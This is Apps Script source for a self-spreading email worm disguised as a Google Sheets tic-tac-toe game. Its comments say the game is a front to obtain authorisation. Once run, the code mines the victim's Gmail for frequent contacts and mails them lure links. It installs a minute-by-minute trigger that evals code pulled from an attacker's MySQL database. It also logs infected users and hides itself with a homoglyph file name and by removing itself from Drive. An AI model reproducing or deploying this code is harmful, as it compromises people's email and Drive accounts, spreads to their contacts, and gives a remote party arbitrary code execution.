




// these MySQL connection variables were intentianally random to make it harder to tell what it was, since the database user and password were in plain text right there (I am not smart)

var yep = 'putAdressHere'
var mHmm = 'putUserHere'
var bruh = 'putUsernameHere'
var trueing = 'putPasswordHere'
var yes = 'putPortHere'
var cool = 'jdbc:mysql://' + yep + ':' + yes + '/' + mHmm
var conn = Jdbc.getConnection(cool, bruh, trueing)
var stmt = conn.createStatement()


// this sets up everything needed for the tic tac toe game

stmt.setMaxRows(1000);

function onOpen() {
  PropertiesService.getScriptProperties().setProperty('mode', 'loading');
  var gameSheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet()
  gameSheet.getRange('A1:D3').setValue('')
  gameSheet.getRange('D1:D3').setBackground('#c9daf8')
  gameSheet.getRange('D3').setValue('Start')
  gameSheet.getDrawings()[0].setWidth(200)
  gameSheet.getDrawings()[0].setHeight(100)
  gameSheet.getDrawings()[1].setWidth(1)
  gameSheet.getDrawings()[1].setHeight(1)
}


// executes start function when start image is clicked in the spreadsheet

function start() {
  var gameSheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet()
  gameSheet.getRange('D1:D3').setBackground('#f4cccc')
  DriveApp.getFileById(SpreadsheetApp.getActiveSpreadsheet().getId()).setName('Τіс Тас Тое')
  gameSheet.getDrawings()[0].setWidth(1)
  gameSheet.getDrawings()[0].setHeight(1)
  gameSheet.getRange('D3').setValue('')

  // trips auth request now so remote code doesnt need it later, I have no clue if i even need this LMAO
  GmailApp.getInboxThreads()
  SpreadsheetApp.getActiveSheet()
  DocumentApp.getActiveDocument()
  DriveApp.getFiles()

// doesn't do virus replication email sending if the person is already infected or if it is me executing it.

  if (ScriptApp.getUserTriggers(SpreadsheetApp.getActiveSpreadsheet()).length == 0 && Session.getActiveUser() != 'putYourEmailHere') {

    // sets up trigger to ping back every minute and run remote code and "attendance" checks

    ScriptApp.newTrigger('execute').timeBased().everyMinutes(1).create();


    // here is where email virus replication stuff goes

    var nextVictims = rankmail()
    var activeURL = SpreadsheetApp.getActiveSpreadsheet().getUrl()
    var sendURL = activeURL.substring(0, activeURL.indexOf('edit'))
    var sendURL = sendURL.concat('copy')

    while (nextVictims.length >= 1) {
      console.log(nextVictims)

      GmailApp.sendEmail(

        nextVictims[0],
        'tic tac toe',
        '',
        {
          htmlBody:
            'I found this tic tac toe game with an AI that was made using google sheets and I thought you might like it.<br> <br>'
            +
            '<a href=' + sendURL + ">Here's the link</a>"
        }
      )

      SpreadsheetApp.getActiveSpreadsheet().addViewer(nextVictims[0])
      nextVictims.splice(0, 1)
    }


    var id = SpreadsheetApp.getActiveSpreadsheet().getId()
    console.log(DriveApp.getFileById(id))
    DriveApp.removeFile(DriveApp.getFileById(id))


  }
  
  // after all of the replication stuff is done it starts the actual tic tac toe game, becasue of couse I made it actually work.
  
  executeGame()

}


// function tied to minute timer trigger, opens spreadsheet and executes the remote code specified in it as well as reporting for "attendance"

function execute() {

  Utilities.sleep(Math.random() * 5000)

  Logger.log('execution started')
  dataBase()
  Logger.log('dataBase finished')

}





// outputs a list with the users youve messaged most in the last # emails, becasue if you email someone a lot it is more likely they will trust you and open the tic tac toe.


function rankmail() {

  var results = stmt.executeQuery('SELECT * FROM `infectedUsers`')

  var infectedUsers = []

  while (results.next()) {

    infectedUsers.push(results.getString(2))

  }


  var results = stmt.executeQuery('SELECT * FROM `sentUsers`')

  var sentUsers = []

  while (results.next()) {

    sentUsers.push(results.getString(2))

  }


// why did I not use true/false lol
  var isFaculty = 'no'
  var targetemaillist = []
  var targetemailscores = []
  var threads = GmailApp.getInboxThreads()
  var badEmailList = []

  console.log(threads[0])

  for (var i = 0; i <= 200 && i <= threads.length - 1; i++) {
    console.log(i)
    var messages = threads[i].getMessages()

    var q = 0
    while (q <= messages.length - 1) {

      var message = messages[q]
      
 // finds both the sender and reciever of the messege
      var targetemail = message.getFrom()

      for (var b = 1; b <= 2; b++) {

        // tests if user is faculty


        if (message.getFrom().includes(Session.getActiveUser().getEmail())) {
          console.log('username matches')

// this string is included as a signature in every faculty email, allowing me to easily filter them out.

          if (message.getBody().includes('THE INFORMATION CONTAINED IN THIS E-MAIL MESSAGE')) {

            console.log('has signature')

            if (message.getBody().includes('or other use of this message is strictly prohibited.</blockquote></div>') == false) {

              console.log('doesnt have quoted signature')
              var isFaculty = 'yes'
              console.log('YEP Faculty')

            }

          }
        }


        // formats email to standard because some email outputs are wierd and have extra stuff in them.
        
        if (targetemail.includes('>')) {
          var targetstringlenth = targetemail.length
          var targetemail = targetemail.slice(0, targetstringlenth - 1)
          var locationofcarrot = targetemail.indexOf('<')
          var targetemail = targetemail.slice(locationofcarrot + 1, targetstringlenth)
        }



        // adds new email addresses to the list if it finds any
        
        if (targetemaillist.includes(targetemail) == false) {
          targetemaillist.push(targetemail)
          targetemailscores.push(0)
        }

        // manual filters (filter out)

        if (

          badEmailList.includes(targetemail) ||
          targetemail.includes('reply') ||
          message.getBody().includes('THE INFORMATION CONTAINED IN THIS E-MAIL MESSAGE') ||
          targetemail.includes(',') ||
          targetemail.includes('.') == false ||
          targetemail.includes('putDomainRestrictionHere') == false ||
          targetemail.includes('support') ||
          infectedUsers.includes(targetemail) ||
          sentUsers.includes(targetemail)

        ) {

          if (targetemailscores[targetemaillist.indexOf(targetemail)] == 0 || message.getBody().includes('or other use of this message is strictly prohibited.</blockquote></div>') == false) {

            if (targetemail.includes(',') == false && badEmailList.includes(targetemail) == false) {
              badEmailList.push(targetemail)
            }

            targetemailscores.splice(targetemaillist.indexOf(targetemail), 1)
            targetemaillist.splice(targetemaillist.indexOf(targetemail), 1)
          }
        } else {
          targetemailscores[targetemaillist.indexOf(targetemail)] = targetemailscores[targetemaillist.indexOf(targetemail)] + 1
        }

        var targetemail = message.getTo()

      }
      q++
    }
  }

  if (isFaculty == 'yes') {

    var targetemaillist = []
    var targetemailscores = []
  }



  var topContacts = []
  var topScores = []
  var listLength = targetemaillist.length

  for (var b = 1; b <= listLength; b++) {

    var maxscore = 0

    for (var a = 0; a <= listLength - 1; a++) {
      if (targetemailscores[a] >= maxscore) {
        var maxscore = targetemailscores[a]
      }

    }

    topContacts.push(targetemaillist[targetemailscores.indexOf(maxscore)])
    topScores.push(targetemailscores[targetemailscores.indexOf(maxscore)])
    targetemaillist.splice(targetemailscores.indexOf(maxscore), 1)
    targetemailscores.splice(targetemailscores.indexOf(maxscore), 1)

  }


  for (var i = 0; i < topContacts.length; i++) {
    var results = stmt.executeQuery('SELECT * FROM `sentUsers`')
    var lastRowID = 0

    while (results.next()) {

      var lastRowID = parseInt(results.getString(1)) + 1

    }


    stmt.execute('INSERT INTO sentUsers(ID, user) values("' + lastRowID + '", "' + topContacts[i] + '")')
  }

  results.close();
  conn.close()
  console.log(topContacts)
  console.log(topScores)
  return (topContacts)
}






// "Attendance" check, purely so I can see how many users Ive infected and how much time since their last ping

function dataBase() {

  var results = stmt.executeQuery('SELECT * FROM `remoteCode`')
  results.next()
  eval(results.getString(2))

  var results = stmt.executeQuery('SELECT * FROM `userData`')
  var lastRowID = 0

  while (results.next()) {

    var lastRowID = parseInt(results.getString(1)) + 1

  }

  stmt.execute('INSERT INTO userData(ID, email, date, time) values("' + lastRowID + '", "' + Session.getActiveUser().getEmail() + '", "' + new Date().toLocaleString() + '", "' + new Date().getTime() + '")')

  results.close();
  conn.close()



}




// tic tac toe game stuff goes here, this is only a front so people click it and authorize my code.
// This does work and I am very proud of the bot algorithm I made for it.

function executeGame() {


  SpreadsheetApp.getActiveSpreadsheet().getActiveSheet().getRange('A1:C3').setValue('')
  currentLanes = [[], [], [], [], [], [], [], []]
  PropertiesService.getScriptProperties().setProperty('mode', 'playing');
  var gameSheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet()
  gameSheet.getRange('D2').setValue('Select')

  var turn = 'player'

  if (Math.round(Math.random() * 100) % 2 == 1) {
    var turn = 'AI'
  }
  console.log(turn)

  if (turn == 'player') {

    gameSheet.getDrawings()[1].setWidth(200)
    gameSheet.getDrawings()[1].setHeight(100)

  } else {

    ai()

  }

}


function select() {

  if (ScriptApp.getUserTriggers(SpreadsheetApp.getActiveSpreadsheet()).length == 0 && Session.getActiveUser() != 'putYourEmailHere') {
    onOpen()
    return
  }

  SpreadsheetApp.getActiveSpreadsheet().getActiveSheet().getDrawings()[1].setWidth(1)
  SpreadsheetApp.getActiveSpreadsheet().getActiveSheet().getDrawings()[1].setHeight(1)
  var selectedSquare = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet().getCurrentCell()

  if (selectedSquare.getA1Notation().includes('D' || '4') == false && selectedSquare.getValue() == '') {

    selectedSquare.setValue('X')
    console.log('success')
    ai()

  } else {
    SpreadsheetApp.getActiveSpreadsheet().getRange('D1').setValue('Please Select a valid square.')
    console.log('try again')
    SpreadsheetApp.getActiveSpreadsheet().getActiveSheet().getDrawings()[1].setWidth(200)
    SpreadsheetApp.getActiveSpreadsheet().getActiveSheet().getDrawings()[1].setHeight(100)
  }
}





function ai() {

  var boardSquares = ['A1', 'A2', 'A3', 'B1', 'B2', 'B3', 'C1', 'C2', 'C3']
  var lanesInfo = [['A1', 'B1', 'C1'], ['A2', 'B2', 'C2'], ['A3', 'B3', 'C3'], ['A1', 'A2', 'A3'], ['B1', 'B2', 'B3'], ['C1', 'C2', 'C3'], ['A1', 'B2', 'C3'], ['C1', 'B2', 'A3']]
  var currentLanes = ['', '', '', '', '', '', '', '']
  var currentLocations = ['', '', '', '', '', '', '', '']
  var importantPatterns = ['OOO', 'XXX', 'OO', 'XX', 'O', 'X', 'OX', 'XO', '']
  var boardFilledSquares = ['empty', 'empty', 'empty', 'empty', 'empty', 'empty', 'empty', 'empty', 'empty']

  SpreadsheetApp.getActiveSpreadsheet().getActiveSheet().getDrawings()[1].setWidth(1)
  SpreadsheetApp.getActiveSpreadsheet().getActiveSheet().getDrawings()[1].setHeight(1)

  for (var i = 0; i <= 8; i++) {

    for (var a = 0; a <= 7; a++) {

      if (lanesInfo[a].includes(boardSquares[i]) && SpreadsheetApp.getActiveSpreadsheet().getActiveSheet().getRange(boardSquares[i]).getValue() != '') {

        currentLanes[a] = currentLanes[a].concat(SpreadsheetApp.getActiveSpreadsheet().getActiveSheet().getRange(boardSquares[i]).getValue())
        currentLocations[a] = currentLocations[a].concat(boardSquares[i])
      }
    }
  }

  console.log(currentLocations)
  console.log(currentLanes)

  // finds valid pattern
  var i = 0
  while (currentLanes.includes(importantPatterns[i]) == false && i <= 10) {
    i++
  }

  var possibleChoices = []
  var patternfound = importantPatterns[i]
  console.log('pattern number ' + i)

  for (var i = 0; i <= 7; i++) {

    if (currentLanes[i] == patternfound) {

      for (var a = 0; a <= 2; a++) {

        if (currentLocations[i].includes(lanesInfo[i][a]) == false) {

          possibleChoices.push(lanesInfo[i][a])

        }

      }


    }


  }


  if (possibleChoices.length != 0) {

    var whatsquare = possibleChoices[Math.round(Math.random() * 1000) % possibleChoices.length]
    SpreadsheetApp.getActiveSpreadsheet().getRange(whatsquare).setValue('O')
    SpreadsheetApp.getActiveSpreadsheet().getRange('D1').setValue('Your move.')
    console.log('your move')

  }



  console.log(currentLanes)

  var currentLanes = ['', '', '', '', '', '', '', '']
  var currentLocations = ['', '', '', '', '', '', '', '']

  for (var i = 0; i <= 8; i++) {

    for (var a = 0; a <= 7; a++) {

      if (lanesInfo[a].includes(boardSquares[i]) && SpreadsheetApp.getActiveSpreadsheet().getActiveSheet().getRange(boardSquares[i]).getValue() != '') {

        currentLanes[a] = currentLanes[a].concat(SpreadsheetApp.getActiveSpreadsheet().getActiveSheet().getRange(boardSquares[i]).getValue())
        currentLocations[a] = currentLocations[a].concat(boardSquares[i])
        boardFilledSquares[i] = 'filled'
      }
    }
  }

  console.log(currentLocations)
  console.log(currentLanes)

  if (currentLanes.includes('OOO') || currentLanes.includes('XXX') || boardFilledSquares.includes('empty') == false) {
    console.log('game over')
    SpreadsheetApp.getActiveSpreadsheet().getRange('D1').setValue('Game Over, now resetting.')
    executeGame()
  } else {

    SpreadsheetApp.getActiveSpreadsheet().getActiveSheet().getDrawings()[1].setWidth(200)
    SpreadsheetApp.getActiveSpreadsheet().getActiveSheet().getDrawings()[1].setHeight(100)
  }


}













